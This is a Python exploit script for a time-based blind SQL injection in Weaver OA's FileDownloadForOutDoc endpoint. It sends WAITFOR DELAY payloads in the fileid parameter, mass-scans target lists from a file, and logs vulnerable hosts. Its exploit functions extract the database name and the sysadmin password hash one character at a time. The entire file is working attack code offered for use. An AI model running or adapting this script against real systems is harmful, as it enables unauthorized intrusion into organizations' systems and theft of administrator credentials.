import argparse
import random
import requests
import urllib3

# Disable the insecure request warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class colors:
    # Define color codes
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

banner = """
 __  __                   _
|  \/  | __ _ _ __  _ __ (_)_  __
| |\/| |/ _` | '_ \| '_ \| \ \/ /
| |  | | (_| | | | | | | | |>  <
|_|  |_|\__,_|_| |_|_| |_|_/_/\_\


                version:1.0

    泛微OA FileDownloadForOutDoc reception SQL inject 单线程检测利用脚本
"""

# Perform password traversal based on the default table of the system
def exp_passwd(url, username):
    print(colors.END + "Traversing the default database password of the system")
    str_list = "qwertyuioplkjhgfdsazxcvbnm@._1234567890$QWERTYUIOPLKJHGFDSAZXCVBNM"
    list_passwd = ""
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    for j in range(1, 35):
        for i in str_list:
            fileid = random.randint(1000, 999999)
            data = f"fileid={fileid}+IF ASCII(SUBSTRING((select password from HrmResourceManager where loginid='sysadmin'), {j}, 1))={ord(i)} WAITFOR DELAY+'0:0:5'&isFromOutImg=1"
            try:
                response = requests.post(url=str(url) + "/weaver/weaver.file.FileDownloadForOutDoc", headers=header, data=data, verify=False)

                if response.elapsed.total_seconds() >= 5:
                    list_passwd += i
                    print(colors.GREEN + f"Traversing: Character {j}  ---->  {i}")
                    break
            except Exception as e:
                print(colors.RED + f"ERROR: {e}")
    print(colors.RED + f"Ciphertext: {list_passwd}")

# Detect MSSQL injection
def poc(url):
    host = url.replace("https://","").replace("http://","")
    header = {
        "Host": f"{host}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    try:
        print(colors.END + f"INFO: Performing MSSQL delay test --> {url}")
        poc_url = str(url) + "/weaver/weaver.file.FileDownloadForOutDoc"
        data = f"isFromOutImg=1&fileid={int(random.randint(1000, 99999))}+WAITFOR+DELAY+'0:0:5'"
        response = requests.post(url=poc_url, headers=header, data=data, timeout=10, verify=False)

        if response.elapsed.total_seconds() >= 5:
            print(colors.GREEN+f"FileDownloadForOutDoc SQL injection found --> {url}")
            f = open("res.txt","a+")
            f.write(poc_url)
            f.write("\n")
            f.close()
    except Exception as e:
        print(colors.RED + f"ERROR: {e}")

# Traversal of database names
def exp_database(url):
    print(colors.END + "Traversing the default databases of the system")
    db_name = ""
    str_list = "qwertyuioplkjhgfdsazxcvbnm@._1234567890$QWERTYUIOPLKJHGFDSAZXCVBNM"
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    for j in range(1, 10):
        for i in str_list:
            exp_url = str(url) + f"/weaver/weaver.file.FileDownloadForOutDoc"
            exp_data = f"isFromOutImg=1&fileid={int(random.randint(1000, 999999))} IF ASCII(SUBSTRING(DB_name(), {j}, 1))={ord(i)} WAITFOR DELAY '0:0:5'"
            try:
                response = requests.post(url=exp_url, headers=header, data=exp_data, verify=False, timeout=15)
                if response.elapsed.total_seconds() >= 5:
                    db_name += i
                    print(colors.GREEN + f"Traversal in progress, current successful field: {i}")
                    break
            except Exception as e:
                print(colors.RED + f"ERROR: {e}")
    if len(db_name) > 0:
        print(colors.RED + f'Current database: {db_name}' )
    else:
        print(colors.RED + "Failed to traverse the database name")

def main():
    parser = argparse.ArgumentParser(description='''泛微OA FileDownloadForOutDoc reception SQL inject ''')
    parser.add_argument('-u', '-url', dest="url", type=str, help="Single URL detection, e.g., http://www.qax.com", required=False)
    parser.add_argument('-f', '-file', dest="file", nargs='?', type=str, help="Multiple targets detection, file format: http://www.qax.com", required=False)
    parser.add_argument('-e', '-exp', dest='exp', default="1", nargs='?', help="Traverse the password hash value of the sysadmin database using exp", required=False)
    parser.add_argument('-db', '-database', dest='database', nargs='?', default="mssql", help="Traversal of the current database name using exp", required=False)

    url_arg = parser.parse_args().url
    file_arg = parser.parse_args().file
    exp_arg = parser.parse_args().exp
    database_arg = parser.parse_args().database
    if url_arg is None and file_arg is None:
        print(colors.END + "Please use the -h command to view the command usage --by FeiNiao")

    elif exp_arg == '1' and url_arg is not None and database_arg =='mssql':
        poc(url_arg)

    elif file_arg is not None and url_arg is None:
        file = open(file_arg).readlines()
        j = 1
        for i in file:
            print(colors.END + f"Line {j}", end=" ")
            poc(i.replace("\n",""))
            j += 1
        print(colors.GREEN + "Results are stored in the res.txt file in the current directory")

    elif exp_arg != '1' and url_arg is not None and database_arg == "mssql":
        exp_passwd(url_arg, 'sysadmin')

    elif exp_arg == '1' and url_arg is not None and (database_arg != "mssql" or file_arg == "1"):
        exp_database(url_arg)

    else:
        print(colors.YELLOW + "Please read the operation manual carefully")

if __name__ == '__main__':
    print(colors.END + banner)
    main()
